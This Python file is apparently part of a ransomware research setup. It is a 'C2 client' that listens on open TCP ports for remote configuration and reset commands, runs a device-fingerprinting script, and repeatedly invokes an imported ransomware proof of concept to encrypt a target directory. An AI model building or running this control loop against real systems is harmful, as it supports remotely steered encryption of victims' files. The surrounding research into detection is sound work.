import os
import signal
from argparse import ArgumentParser
from json import loads
from multiprocessing import Process
from os import path, remove
from socket import AF_INET, SOCK_STREAM, socket
from subprocess import call
from time import sleep, time

from globals import get_config_path, get_reset_path, get_terminate_path, update_existing_config
from rwpoc import run

TARGET_PATH = "<start-path-on-target-device>"


def parse_args():
    parser = ArgumentParser(description='C2 Client')
    parser.add_argument('-n', '--number',
                        help='Number of fingerprints to collect in one encryption run.',
                        default=0,
                        action="store")

    return parser.parse_args()


def listen_for_config_changes():
    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.bind(("0.0.0.0", 42666))
        sock.listen(1)

        while True:
            conn, addr = sock.accept()  # keep listening for new connections
            with conn:
                while True:
                    data = conn.recv(1024)  # listen for incoming data of connection
                    if not data:
                        break
                    new_config = loads(data.decode(encoding="utf-8"))
                    print("received", new_config)
                    update_existing_config(new_config)


def listen_terminate_episode():
    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.bind(("0.0.0.0", 42667))
        sock.listen(1)

        while True:
            conn, addr = sock.accept()  # keep listening for new connections
            with conn:
                while True:
                    data = conn.recv(1024)  # listen for incoming data of connection
                    if not data:
                        break
                    command = data.decode(encoding="utf-8").strip().lower()
                    print("received", command)
                    reset_path = get_reset_path()
                    terminate_path = get_terminate_path()
                    if command == "reset" and not path.exists(reset_path):
                        with open(reset_path, "x"):
                            pass
                    elif command == "terminate" and not path.exists(terminate_path):
                        with open(terminate_path, "x"):
                            pass


def collect_device_fingerprint(limit):
    # FIXME: using call() spawns another sub-process that will get orphaned and not be terminated by kill_process()
    if limit > 0:
        """
        Remember: once the limit is reached the subprocess is terminated.
        However, the (parent) encryption process is still running to completion
        and will re-trigger the FP collection on the next iteration - up to the limit.
        """
        call(["./fingerprinter.sh", "-n {}".format(limit)])
    else:
        call("./fingerprinter.sh")  # without option "-n <limit>", this will continuously collect FP


def kill_process(proc):
    print("kill Process", proc)
    proc.terminate()
    print("killed Process", proc)
    timeout = 10
    start = time()
    while proc.is_alive() and time() - start < timeout:
        sleep(1)
    if proc.is_alive():
        proc.kill()
        print("...we had to put it down", proc)
        sleep(2)
        if proc.is_alive():
            os.kill(proc.pid, signal.SIGKILL)
            print("...die already", proc)
        else:
            print(proc, "now dead")
    else:
        print(proc, "now dead")


if __name__ == "__main__":
    # Parse arguments
    args = parse_args()
    num_fp = int(args.number)

    # Start subprocess to integrate config changes
    procs = []
    proc_config = Process(target=listen_for_config_changes)
    procs.append(proc_config)
    proc_config.start()

    # Start subprocess to listen for episodes terminated by the agent
    proc_reset = Process(target=listen_terminate_episode)
    procs.append(proc_reset)
    proc_reset.start()

    # Start subprocess to fingerprint device behavior
    proc_fp = Process(target=collect_device_fingerprint, args=(num_fp,))
    procs.append(proc_fp)
    proc_fp.start()

    # Start off encryption with clean folder
    config_path = get_config_path()
    if path.exists(config_path):
        remove(config_path)
    reset_path = get_reset_path()
    if path.exists(reset_path):
        remove(reset_path)
    terminate_path = get_terminate_path()
    if path.exists(terminate_path):
        remove(terminate_path)

    print("Waiting for initial config...")
    while not path.exists(config_path):
        sleep(1)

    try:
        abs_paths = TARGET_PATH

        while True:
            # input("\nEnter: start encrypting")

            # input("\nwait shortly for child to start")
            print("\nENCRYPT")
            run(encrypt=True, absolute_paths=abs_paths)  # encrypt

            # input("\nEnter: start decrypting")
            print("\nDECRYPT")
            # run(encrypt=False, absolute_paths=abs_paths)  # decrypt
            call("./reset_corpus.sh")

            if path.exists(reset_path):
                remove(reset_path)
            if path.exists(terminate_path):
                remove(terminate_path)
                break
    finally:
        print("finally")
        for proc in procs:
            if proc.is_alive():
                kill_process(proc)
            else:
                print("Process", proc, "already dead.")
